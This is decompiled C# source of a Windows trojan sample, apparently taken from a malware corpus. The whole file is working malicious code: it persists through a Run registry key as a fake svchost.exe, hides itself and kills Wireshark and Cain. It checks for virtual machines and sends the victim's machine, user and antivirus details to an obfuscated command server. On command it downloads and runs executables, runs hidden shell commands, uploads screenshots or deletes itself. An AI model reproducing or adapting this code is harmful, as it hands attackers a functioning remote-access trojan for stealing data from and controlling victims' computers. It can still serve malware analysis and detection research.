// Decompiled with JetBrains decompiler
// Type: changeTHISwithRESHACKER.Module1Main
// Assembly: changeTHISwithRESHACKER, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: BD962891-627B-4608-868A-29B21E973A15
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.Win32.Foreign.mycy-178f8bbd8abd5a5024e1783c747faa018fe4aba399f7b9e234a14d386993e610.exe

using changeTHISwithRESHACKER.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using System;
using System.Collections;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Timers;
using System.Windows.Forms;

namespace changeTHISwithRESHACKER
{
  [StandardModule]
  internal sealed class Module1Main
  {
    private static string cLvtWZX5SU3Nq7L = "";
    private static string y8pQJknjhtM36bK = "";
    private static string[] tQRy2VuKzzLjGLD;
    private static string dK3zLCbLFxUH9Xw = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
    private static string version = "1.2.3";
    private static string URL = "";
    [AccessedThroughProperty("timer1")]
    private static System.Timers.Timer _timer1;
    [AccessedThroughProperty("timer2")]
    private static System.Timers.Timer _timer2;
    private static string Z9AfcDgu;
    private static string RT6FsUnNC2qQkXW;
    private static string SSDDO;
    private static string mGvTAG3tjWYZWR6;
    private static Mutex B4mkWnA;
    private static string F2kqcz5;
    private static Thread bfJe3CYtDQKjkzM;
    private static string pVGx8zVMtnrFnnH;
    private static Thread p4a9uygnSazEjcP;

    static Module1Main()
    {
      Module1Main.timer1 = new System.Timers.Timer();
      Module1Main.timer2 = new System.Timers.Timer();
      Module1Main.Z9AfcDgu = "";
      Module1Main.RT6FsUnNC2qQkXW = "";
      Module1Main.SSDDO = "";
      Module1Main.mGvTAG3tjWYZWR6 = Path.GetTempPath();
      Module1Main.F2kqcz5 = "58@07408911@795212792@4".Replace("@", "");
      Module1Main.bfJe3CYtDQKjkzM = new Thread(new ThreadStart(Module1Main.JAQq5uDEbQkAvBt));
      Module1Main.pVGx8zVMtnrFnnH = Module1Main.dK3zLCbLFxUH9Xw + "Mi@croso@ft\\svchost.exe".Replace("@", "");
      Module1Main.p4a9uygnSazEjcP = new Thread(new ThreadStart(Module1Main.M8xXTAubqFEuptR));
    }

    private static void M8xXTAubqFEuptR()
    {
      while (true)
      {
        try
        {
          string name = "Hos@t @Pr@o@c@e@s@s f@o@r Win@dow@s @Se@rv@ice@s".Replace("@", "");
          RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Sof@t@wa@r@e\\M@ic@ros@oft@\\Wi@ndo@ws\\C@ur@ren@tVer@sion\\R@un".Replace("@", ""), true);
          if (registryKey.OpenSubKey(name) == null)
            registryKey.SetValue(name, (object) Module1Main.pVGx8zVMtnrFnnH);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        Thread.Sleep(25000);
      }
    }

    private static object pjKGDJ7B7LC3LSk()
    {
      object obj;
      try
      {
        string str;
        if (!new WebClient().DownloadString(Module1Main.URL).Contains("Bad Request"))
        {
          str = (string) null;
          obj = (object) false;
        }
        else
        {
          str = (string) null;
          obj = (object) true;
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        obj = (object) false;
        ProjectData.ClearProjectError();
      }
      return obj;
    }

    private static void QfZTbBjPq7kSgeD()
    {
      string Expression = Module1Main.AqaWKJTD7LcqStH("h@wid=".Replace("@", "") + Module1Main.RT6FsUnNC2qQkXW + "&idl@e=".Replace("@", "") + Module1Main.y8pQJknjhtM36bK + "&c@apti@on=".Replace("@", "") + Module1Main.RpdtLDX8Y2fBAZJ());
      if (Expression.Length == 0)
        return;
      string[] strArray = Strings.Split(Expression, "#<SN>#");
      if (strArray.Length <= 1)
        return;
      if (Operators.CompareString(strArray[0], "load", false) == 0)
        new Thread((ParameterizedThreadStart) (a0 => Module1Main.bJLmxYuXnjK45Zk(Conversions.ToString(a0))))
        {
          IsBackground = true
        }.Start((object) strArray[1]);
      else if (Operators.CompareString(strArray[0], "cmd", false) == 0)
        new Thread((ParameterizedThreadStart) (a0 => Module1Main._53ZQC9xm9QQPJDV(Conversions.ToString(a0))))
        {
          IsBackground = true
        }.Start((object) strArray[1]);
      else if (Operators.CompareString(strArray[0], "scre@en".Replace("@", ""), false) == 0)
      {
        new Thread(new ThreadStart(Module1Main.Qjrjyk4RfjZrfhz))
        {
          IsBackground = true
        }.Start();
      }
      else
      {
        if (Operators.CompareString(strArray[0], "del@ete".Replace("@", ""), false) != 0)
          return;
        Module1Main.hZ63ERnj();
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    private static void SSqzPSAtRsSQAXs()
    {
      if (!Application.ExecutablePath.Contains(Module1Main.pVGx8zVMtnrFnnH))
      {
        if (!System.IO.File.Exists(Module1Main.pVGx8zVMtnrFnnH))
        {
          try
          {
            System.IO.File.Copy(Application.ExecutablePath, Module1Main.pVGx8zVMtnrFnnH);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        else
        {
          Module1Main.LcT7rYzBKeSVtXa(Application.ExecutablePath);
          try
          {
            System.IO.File.Delete(Module1Main.pVGx8zVMtnrFnnH);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          try
          {
            System.IO.File.Copy(Application.ExecutablePath, Module1Main.pVGx8zVMtnrFnnH);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        try
        {
          Process.Start(Module1Main.pVGx8zVMtnrFnnH);
          ProjectData.EndApp();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      else
      {
        try
        {
          DirectoryInfo directoryInfo = new DirectoryInfo(Application.ExecutablePath);
          FileAttributes fileAttributes = directoryInfo.Attributes | FileAttributes.Hidden | FileAttributes.System;
          directoryInfo.Attributes = fileAttributes;
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
    }

    private static void JAQq5uDEbQkAvBt()
    {
      while (true)
      {
        Process[] processes = Process.GetProcesses();
        int index = 0;
        while (index < processes.Length)
        {
          Process process = processes[index];
          if (process.MainWindowTitle.ToLower().Contains("w@i@re@sh@a@rk".Replace("@", "")) | process.MainWindowTitle.ToLower().Contains("c@a@i@n".Replace("@", "")))
          {
            try
            {
              process.Kill();
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
          checked { ++index; }
        }
        Thread.Sleep(5000);
      }
    }

    private static string AqaWKJTD7LcqStH(string CqyCxfkQ2saepUL)
    {
      string str;
      try
      {
        HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create(Module1Main.URL);
        httpWebRequest.Method = "POST";
        httpWebRequest.Headers["userAgent"] = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20100101 Firefox/23.0 ";
        httpWebRequest.ContentType = "a@pplicati@on/x-www-f@orm-urlencoded".Replace("@", "");
        byte[] bytes = Encoding.UTF8.GetBytes(CqyCxfkQ2saepUL);
        httpWebRequest.ContentLength = (long) bytes.Length;
        Stream requestStream = httpWebRequest.GetRequestStream();
        requestStream.Write(bytes, 0, bytes.Length);
        requestStream.Close();
        HttpWebResponse response = (HttpWebResponse) httpWebRequest.GetResponse();
        Stream responseStream = response.GetResponseStream();
        StreamReader streamReader = new StreamReader(responseStream);
        string end = streamReader.ReadToEnd();
        streamReader.Close();
        responseStream.Close();
        response.Close();
        str = end;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str = "";
        ProjectData.ClearProjectError();
      }
      return str;
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    private static void Qjrjyk4RfjZrfhz()
    {
      try
      {
        Rectangle a = Screen.AllScreens[0].Bounds;
        ImageCodecInfo[] imageEncoders = ImageCodecInfo.GetImageEncoders();
        EncoderParameters encoderParams = new EncoderParameters(1);
        Rectangle bounds;
        if (Screen.AllScreens.Length >= 2)
        {
          bounds = Screen.AllScreens[1].Bounds;
          a = Rectangle.Union(a, bounds);
        }
        encoderParams.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, 80L);
        using (Bitmap bitmap = new Bitmap(a.Width, a.Height))
        {
          using (Graphics graphics = Graphics.FromImage((Image) bitmap))
          {
            Font font = new Font(FontFamily.GenericSansSerif, 14f, FontStyle.Bold, GraphicsUnit.Point);
            if (bounds.Left > 0)
              graphics.CopyFromScreen(0, 0, 0, 0, bitmap.Size);
            else
              graphics.CopyFromScreen(bounds.Left, 0, 0, 0, bitmap.Size);
            graphics.DrawString("Si@mp@l@e@NET v".Replace("@", "") + Module1Main.version, font, Brushes.Red, 6f, 6f);
            bitmap.Save(Module1Main.mGvTAG3tjWYZWR6 + Module1Main.RT6FsUnNC2qQkXW + ".jpeg", imageEncoders[1], encoderParams);
            try
            {
              WebClient webClient = new WebClient();
              webClient.Encoding = Encoding.Default;
              webClient.Headers.Add("Content-Type", "binary/octet-stream");
              ServicePointManager.Expect100Continue = false;
              webClient.UploadFile(Module1Main.URL + "?scr", "POST", Module1Main.mGvTAG3tjWYZWR6 + Module1Main.RT6FsUnNC2qQkXW + ".jpeg");
              FileSystem.Kill(Module1Main.mGvTAG3tjWYZWR6 + Module1Main.RT6FsUnNC2qQkXW + ".jpeg");
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private static void bJLmxYuXnjK45Zk(string Tn9rxFcyuQg7TUM)
    {
      try
      {
        if (System.IO.File.Exists(Module1Main.mGvTAG3tjWYZWR6 + Tn9rxFcyuQg7TUM.Substring(checked (Tn9rxFcyuQg7TUM.LastIndexOf("/") + 1))))
          System.IO.File.Delete(Module1Main.mGvTAG3tjWYZWR6 + Tn9rxFcyuQg7TUM.Substring(checked (Tn9rxFcyuQg7TUM.LastIndexOf("/") + 1)));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        new WebClient().DownloadFile(Tn9rxFcyuQg7TUM, Module1Main.mGvTAG3tjWYZWR6 + Tn9rxFcyuQg7TUM.Substring(checked (Tn9rxFcyuQg7TUM.LastIndexOf("/") + 1)));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        Process.Start(Module1Main.mGvTAG3tjWYZWR6 + Tn9rxFcyuQg7TUM.Substring(checked (Tn9rxFcyuQg7TUM.LastIndexOf("/") + 1)));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private static void dL6UcMGJqRVksTk()
    {
      Module1Main.y8pQJknjhtM36bK = Module1Main.hXXLYZ35uaeUHQN();
      Module1Main.tQRy2VuKzzLjGLD = Strings.Split(Module1Main.AqaWKJTD7LcqStH("p@cn@ame=".Replace("@", "") + Module1Main.Z9AfcDgu + "&@hw@id=".Replace("@", "") + Module1Main.RT6FsUnNC2qQkXW + "&os=" + Module1Main.SSDDO + "&i@nfo@s=".Replace("@", "") + Module1Main.cLvtWZX5SU3Nq7L + "&ve@rsion@=".Replace("@", "") + Module1Main.version + "&id@le=".Replace("@", "") + Module1Main.y8pQJknjhtM36bK + "&c@aptio@n=".Replace("@", "") + Module1Main.RpdtLDX8Y2fBAZJ()), "<#>");
      Module1Main.timer1.Interval = Conversions.ToDouble(Module1Main.tQRy2VuKzzLjGLD[0]);
      if (Operators.CompareString(Module1Main.version, Module1Main.tQRy2VuKzzLjGLD[1], false) != 0)
        Module1Main._5yHWhwWLGhm23vQ(Module1Main.tQRy2VuKzzLjGLD[2]);
      else
        Module1Main.timer1.Start();
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    private static void Vwtvjc3HXD7xP47()
    {
      try
      {
        Module1Main.URL = new WebClient().DownloadString(Module1Main.NakzxCH48YVUtra("g689pj135689g257m819058689d135c819p708135862689nylpm819044058058:261"));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.EndApp();
        ProjectData.ClearProjectError();
      }
    }

    private static void BKqh5rkVhynxzAZ()
    {
      try
      {
        Module1Main.Z9AfcDgu = Environment.MachineName + "\\" + Environment.UserName;
        Module1Main.RT6FsUnNC2qQkXW = WindowsIdentity.GetCurrent().User.Value.ToString();
        Module1Main.cLvtWZX5SU3Nq7L = Module1Main.nMapsreKWZZ454G();
        Module1Main.SSDDO = new ComputerInfo().OSFullName.ToString();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private static void _53ZQC9xm9QQPJDV(string ujpmHVy82wdJP5G)
    {
      ProcessStartInfo startInfo = new ProcessStartInfo();
      try
      {
        startInfo.Arguments = "/c " + ujpmHVy82wdJP5G;
        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
        startInfo.CreateNoWindow = true;
        startInfo.FileName = "c@md.@e@xe".Replace("@", "");
        Process.Start(startInfo);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    private static void _5yHWhwWLGhm23vQ(string Links)
    {
      if (System.IO.File.Exists(Module1Main.mGvTAG3tjWYZWR6 + "Hp4A7uPv6k8UbqD.ex@e"))
      {
        try
        {
          System.IO.File.Delete(Module1Main.mGvTAG3tjWYZWR6 + "Hp4A7uPv6k8UbqD.e@xe");
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      Module1Main.LcT7rYzBKeSVtXa(Application.ExecutablePath);
      try
      {
        new WebClient().DownloadFile(Links, Module1Main.mGvTAG3tjWYZWR6 + "Hp4A7uPv6k8UbqD.exe");
        Process.Start(new ProcessStartInfo()
        {
          Arguments = "/C ping 1.1.1.1 -n 1 -w 5000 > Nul & Del \"" + Application.ExecutablePath.ToString() + "\" & copy \"" + Module1Main.mGvTAG3tjWYZWR6 + "Hp4A7uPv6k8UbqD.exe\" \"" + Application.ExecutablePath.ToString() + "\" & \"" + Application.ExecutablePath.ToString() + "\"",
          WindowStyle = ProcessWindowStyle.Hidden,
          CreateNoWindow = true,
          FileName = "c@m@d.e@xe".Replace("@", "")
        });
        ProjectData.EndApp();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private static void LcT7rYzBKeSVtXa(string patth)
    {
      try
      {
        DirectoryInfo directoryInfo = new DirectoryInfo(patth);
        FileAttributes attributes = directoryInfo.Attributes;
        FileAttributes fileAttributes = FileAttributes.Normal;
        directoryInfo.Attributes = fileAttributes;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    [DllImport("USER32.DLL")]
    private static extern bool GetLastInputInfo(ref Module1Main.LASTINPUTINFO ii);

    public static long r5SGeUE53c99B2H()
    {
      long num;
      try
      {
        Module1Main.LASTINPUTINFO ii = new Module1Main.LASTINPUTINFO();
        ii.cbSize = checked ((uint) Marshal.SizeOf((object) ii));
        if (Module1Main.GetLastInputInfo(ref ii))
        {
          num = checked ((long) Environment.TickCount - (long) ii.dwTime);
          if (num < 0L)
            num = checked (num + (long) uint.MaxValue + 1L);
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return num;
    }

    public static string hXXLYZ35uaeUHQN()
    {
      string str1;
      try
      {
        string str2 = Strings.Split(new TimeSpan(checked (Module1Main.r5SGeUE53c99B2H() * 10000L)).ToString(), ".")[0];
        str1 = Conversions.ToString(checked ((int) Math.Round(unchecked (Conversions.ToDouble(str2.Split(':')[0]) * 3600.0)) + (int) Math.Round(unchecked (Conversions.ToDouble(str2.Split(':')[1]) * 60.0)) + Conversions.ToInteger(str2.Split(':')[2])));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str1 = "ERROR";
        ProjectData.ClearProjectError();
      }
      return str1;
    }

    [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr GetForegroundWindow();

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern int GetWindowText(IntPtr hwnd, StringBuilder text, int count);

    private static string RpdtLDX8Y2fBAZJ()
    {
      StringBuilder text = new StringBuilder(256);
      return Module1Main.GetWindowText(Module1Main.GetForegroundWindow(), text, 256) > 0 ? text.ToString() : "";
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    private static void gPjQpz7n69uH57B()
    {
      Module1Main.B4mkWnA = new Mutex(false, Module1Main.F2kqcz5);
      if (Module1Main.B4mkWnA.WaitOne(0, false))
        return;
      Module1Main.B4mkWnA.Close();
      Module1Main.B4mkWnA = (Mutex) null;
      ProjectData.EndApp();
    }

    public static string NakzxCH48YVUtra(string text)
    {
      char[] charArray = text.Replace("261", "ptth").Replace("058", "/").Replace("135", ".").Replace("044", "s").Replace("708", "nuf").Replace("819", "i").Replace("257", "a").Replace("862", "w").Replace("689", "e").Replace("803", "u").ToCharArray();
      Array.Reverse((Array) charArray);
      return new string(charArray);
    }

    private static string nMapsreKWZZ454G()
    {
      string str1;
      try
      {
        string str2 = "";
        string str3 = "none";
        try
        {
          object objectValue = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(Interaction.GetObject("winmgmts:\\\\" + Environment.MachineName + "\\ro@o@t\\Se@cur@ityC@e@nt@er2".Replace("@", ""))), (System.Type) null, "ExecQuery", new object[1]
          {
            (object) "Se@le@ct * F@rom A@nti@Vir@usP@roduct".Replace("@", "")
          }, (string[]) null, (System.Type[]) null, (bool[]) null));
          try
          {
            foreach (object obj in (IEnumerable) objectValue)
              str3 = Conversions.ToString(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(obj), (System.Type) null, "displayName", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null));
          }
          finally
          {
            IEnumerator enumerator;
            if (enumerator is IDisposable)
              (enumerator as IDisposable).Dispose();
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        string str4 = str2 + "A@V P@ro@gr@a@m: ".Replace("@", "") + str3 + "\r\n";
        try
        {
          object objectValue1 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(Interaction.GetObject("w@i@nm@gm@ts:".Replace("@", "")), (System.Type) null, "InstancesOf", new object[1]
          {
            (object) "Wi@n32_Pro@cess@or".Replace("@", "")
          }, (string[]) null, (System.Type[]) null, (bool[]) null));
          try
          {
            foreach (object obj in (IEnumerable) objectValue1)
            {
              object objectValue2 = RuntimeHelpers.GetObjectValue(obj);
              str4 = str4 + "C@P@U Na@m@e: ".Replace("@", "") + Strings.Trim(Conversions.ToString(NewLateBinding.LateGet(objectValue2, (System.Type) null, "Name", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null))).ToString() + "\r\n";
              str4 = str4 + "C@P@U Ta@ktra@te: ".Replace("@", "") + NewLateBinding.LateGet(objectValue2, (System.Type) null, "MaxClockSpeed", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null).ToString() + " MHz x" + Environment.ProcessorCount.ToString() + "\r\n";
            }
          }
          finally
          {
            IEnumerator enumerator;
            if (enumerator is IDisposable)
              (enumerator as IDisposable).Dispose();
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        try
        {
          int num1 = checked ((int) Math.Round(unchecked ((double) MyProject.Computer.Info.TotalPhysicalMemory / 1048576.0)));
          if (num1.ToString().Length <= 3)
          {
            str4 = str4 + "RA@M: ".Replace("@", "") + num1.ToString() + " M@B".Replace("@", "") + "\r\n";
          }
          else
          {
            int num2 = checked ((int) Math.Round(unchecked ((double) num1 / 1024.0)));
            str4 = str4 + "R@AM: ".Replace("@", "") + num2.ToString() + " G@B".Replace("@", "") + "\r\n";
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        try
        {
          object objectValue3 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(Interaction.GetObject("w@i@nm@gm@ts:".Replace("@", "")), (System.Type) null, "InstancesOf", new object[1]
          {
            (object) "Win3@2_Vi@de@oCont@roll@er".Replace("@", "")
          }, (string[]) null, (System.Type[]) null, (bool[]) null));
          try
          {
            foreach (object obj in (IEnumerable) objectValue3)
            {
              object objectValue4 = RuntimeHelpers.GetObjectValue(obj);
              str4 = str4 + "G@P@U Na@m@e: ".Replace("@", "") + Strings.Trim(Conversions.ToString(NewLateBinding.LateGet(objectValue4, (System.Type) null, "Name", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null))).ToString() + "\r\n";
            }
          }
          finally
          {
            IEnumerator enumerator;
            if (enumerator is IDisposable)
              (enumerator as IDisposable).Dispose();
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        str1 = str4;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str1 = "ERROR";
        ProjectData.ClearProjectError();
      }
      return str1;
    }

    public static bool Lac7T9wk()
    {
      bool flag;
      try
      {
        string str = "";
        object objectValue = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(Interaction.GetObject("w@i@nm@gm@ts:".Replace("@", "")), (System.Type) null, "ExecQuery", new object[1]
        {
          (object) "S@ELE@CT * FRO@M Wi@n32_V@i@deoCo@nt@ro@ller".Replace("@", "")
        }, (string[]) null, (System.Type[]) null, (bool[]) null));
        try
        {
          foreach (object obj in (IEnumerable) objectValue)
            str = Conversions.ToString(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(obj), (System.Type) null, "Description", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null));
        }
        finally
        {
          IEnumerator enumerator;
          if (enumerator is IDisposable)
            (enumerator as IDisposable).Dispose();
        }
        flag = str.Contains("V@M".Replace("@", "")) | str.Contains("Virt@ualB@ox".Replace("@", "")) | str.Contains("VM@wa@re".Replace("@", "")) | str.Contains("Cir@ru@s Log@ic".Replace("@", ""));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return flag;
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    private static void hZ63ERnj()
    {
      Module1Main.LcT7rYzBKeSVtXa(Application.ExecutablePath);
      ProcessStartInfo startInfo = new ProcessStartInfo();
      try
      {
        startInfo.Arguments = "/C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del \"" + Application.ExecutablePath.ToString() + "\"";
        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
        startInfo.CreateNoWindow = true;
        startInfo.FileName = "c@md.@e@xe".Replace("@", "");
        Process.Start(startInfo);
        ProjectData.EndApp();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private static System.Timers.Timer timer1
    {
      get => Module1Main._timer1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ElapsedEventHandler elapsedEventHandler = new ElapsedEventHandler(Module1Main.timer1_Elapsed);
        if (Module1Main._timer1 != null)
          Module1Main._timer1.Elapsed -= elapsedEventHandler;
        Module1Main._timer1 = value;
        if (Module1Main._timer1 == null)
          return;
        Module1Main._timer1.Elapsed += elapsedEventHandler;
      }
    }

    private static System.Timers.Timer timer2
    {
      get => Module1Main._timer2;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ElapsedEventHandler elapsedEventHandler = new ElapsedEventHandler(Module1Main.timer2_Elapsed);
        if (Module1Main._timer2 != null)
          Module1Main._timer2.Elapsed -= elapsedEventHandler;
        Module1Main._timer2 = value;
        if (Module1Main._timer2 == null)
          return;
        Module1Main._timer2.Elapsed += elapsedEventHandler;
      }
    }

    private static void timer1_Elapsed(object sender, ElapsedEventArgs e)
    {
      Module1Main.y8pQJknjhtM36bK = Module1Main.hXXLYZ35uaeUHQN();
      Module1Main.QfZTbBjPq7kSgeD();
    }

    private static void timer2_Elapsed(object sender, ElapsedEventArgs e)
    {
      Module1Main.Vwtvjc3HXD7xP47();
      if (!Operators.ConditionalCompareObjectEqual(Module1Main.pjKGDJ7B7LC3LSk(), (object) true, false))
        return;
      Module1Main.BKqh5rkVhynxzAZ();
      Module1Main.dL6UcMGJqRVksTk();
    }

    [STAThread]
    public static void Main()
    {
      Module1Main.gPjQpz7n69uH57B();
      if (Module1Main.Lac7T9wk())
        Module1Main.hZ63ERnj();
      Module1Main.p4a9uygnSazEjcP.IsBackground = true;
      Module1Main.p4a9uygnSazEjcP.Start();
      Module1Main.SSqzPSAtRsSQAXs();
      Module1Main.bfJe3CYtDQKjkzM.IsBackground = true;
      Module1Main.bfJe3CYtDQKjkzM.Start();
      Module1Main.Vwtvjc3HXD7xP47();
      if (Operators.ConditionalCompareObjectEqual(Module1Main.pjKGDJ7B7LC3LSk(), (object) true, false))
      {
        Module1Main.BKqh5rkVhynxzAZ();
        Module1Main.dL6UcMGJqRVksTk();
      }
      else
      {
        Module1Main.timer2.Interval = 120000.0;
        Module1Main.timer2.Start();
      }
      a.BlockAccess();
      Application.Run();
    }

    public struct LASTINPUTINFO
    {
      public uint cbSize;
      public uint dwTime;
    }
  }
}
